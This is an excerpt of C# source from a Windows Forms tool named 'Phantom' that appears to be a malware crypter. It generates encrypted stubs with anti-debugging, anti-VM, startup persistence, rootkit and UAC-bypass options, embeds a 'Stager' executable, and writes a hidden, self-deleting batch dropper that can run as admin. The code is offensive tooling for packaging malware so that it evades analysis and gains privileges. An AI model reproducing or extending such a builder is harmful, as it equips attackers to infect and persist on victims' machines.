...
namespace Phantom
{
    public partial class PhantomMain : Form
    {
        ...
        private void Crypt()
        {
            ...
            if (rootkit.Checked)
            {
                if (fileType == FileType.NET86)
                {
                    fileType = FileType.NET64;
                }
                else if (fileType == FileType.x86)
                {
                    fileType = FileType.x64;
                }
            }
            ...
            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, antiDebug.Checked, antiVM.Checked, startup.Checked, rootkit.Checked, uacBypass.Checked, !isnetasm, rng);
            ...
            if (rootkit.Checked)
            {
                File.WriteAllBytes(@"Stager", Compress(ExtractResource(@"Phantom.Resources.Stager.exe")));
                parameters.EmbeddedResources.Add(@"Stager");
            }
            ...
            string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, selfDelete.Checked, runas.Checked, fileType, ContentLineID, rng);
        ...
        private static bool backupUacBypassBool = false;

        private void rootkit_CheckedChanged(object sender, EventArgs e)
        {
            if (rootkit.Checked)
            {
                if (!uacBypass.Checked)
                {
                    MessageBox.Show("UAC Bypass is not enabled which is required for the rootkit to run, if you don't want to use the UAC Bypass then make sure to run the bat file as admin!");
                }

                //backupUacBypassBool = uacBypass.Checked;
                //uacBypass.Enabled = false;
                //uacBypass.Checked = true;
            }
            else
            {
                //uacBypass.Checked = backupUacBypassBool;
                //uacBypass.Enabled = true;
            }
        }
